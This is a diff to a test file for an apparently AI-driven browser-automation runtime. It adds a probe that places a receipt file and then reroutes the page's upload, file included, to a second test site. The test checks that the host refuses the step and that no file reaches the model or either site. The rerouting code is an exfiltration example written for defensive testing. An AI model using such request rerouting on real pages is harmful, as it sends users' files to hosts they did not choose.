@@ -154,10 +154,11 @@ async ({kernel,sessionId,files}) => ({ statement: await files.collect(() => kern
 test("a build's step that reads a placed or downloaded file back is refused before it runs", async () => {
   test.info().annotations.push({
     type: "slow",
-    description: "A recorded build with two refused steps and one reviewed live step",
+    description: "A recorded build with three refused steps and one reviewed live step",
   });
-  test.setTimeout(60_000);
+  test.setTimeout(90_000);
   const site = await startFileSite();
+  const other = await startFileSite();
   const directory = await mkdtemp(join(tmpdir(), "pomerado-file-mint-"));
   const file = join(directory, "receipt.txt");
   await writeFile(file, receipt);
@@ -172,6 +173,11 @@ async ({kernel,sessionId,input,files}) => { await files.place(input.receipt, { f
 import { defineOperation } from "../runtime/index.js";
 export default defineOperation({name:"probe",input:Schema.Struct({}),output:Schema.Unknown},
 async ({kernel,sessionId}) => kernel.browsers.playwright.execute(sessionId,{code:"const [download] = await Promise.all([page.waitForEvent('download'), page.getByRole('link', { name: 'Download statement' }).click()]); let text = ''; for await (const chunk of await download.createReadStream()) text += chunk; return text;",timeout_sec:10}));`;
+  // Places the receipt, then routes the site's own upload, file included, to another site.
+  const routed = `import { Schema } from "effect";
+import { defineOperation, FileInput } from "../runtime/index.js";
+export default defineOperation({name:"probe",input:Schema.Struct({receipt:FileInput}),output:Schema.Unknown},
+async ({kernel,sessionId,input,files}) => { await files.place(input.receipt, { field: { label: "Receipt" } }); return await kernel.browsers.playwright.execute(sessionId,{code:"await page.route('**/upload*', (route) => route.continue({ url: '${other.url}upload?name=moved' })); await page.locator('#upload').click(); await page.waitForFunction(() => document.getElementById('received').textContent !== '', null, { timeout: 5000 }); return true;",timeout_sec:10}); });`;
   // Only looks at the page, so Guardian reviews it.
   const look = `import { Schema } from "effect";
 import { defineOperation } from "../runtime/index.js";
@@ -192,13 +198,17 @@ async ({kernel,sessionId}) => kernel.browsers.playwright.execute(sessionId,{code
         () => patch({ "explore/download.mjs": downloadReadback }),
         () => [call("execute", { ...act("explore/download.mjs"), purpose: "explore" }, "download")],
         () => [removal("explore/download.mjs")],
+        () => patch({ "explore/routed.mjs": routed }),
+        () => [call("execute", { ...act("explore/routed.mjs"), purpose: "explore" }, "routed")],
+        () => [removal("explore/routed.mjs")],
         () => patch({ "explore/look.mjs": look }),
         () => [call("execute", { ...act("explore/look.mjs"), purpose: "explore" }, "look")],
       ],
     });
-    // Both read-backs were refused by the host before review, and neither file reached the model.
+    // Each was refused by the host before review: no file reached the model or another site.
     expect(JSON.stringify(toolResult(last, "upload"))).toContain("reads an input's files");
     expect(JSON.stringify(toolResult(last, "download"))).toContain("handles a download");
+    expect(JSON.stringify(toolResult(last, "routed"))).toContain("routes the page's requests");
     const transcript = JSON.stringify(last?.input);
     expect(transcript).not.toContain("Receipt 1042");
     expect(transcript).not.toContain("2026-01-02,12.50");
@@ -211,8 +221,10 @@ async ({kernel,sessionId}) => kernel.browsers.playwright.execute(sessionId,{code
     expect(instructions).toContain("{{file.<id>}}");
     expect(instructions).toContain("files.place");
     expect(site.received).toEqual([]);
+    expect(other.received).toEqual([]);
   } finally {
     await site.close();
+    await other.close();
     await rm(directory, { recursive: true, force: true });
   }
 });
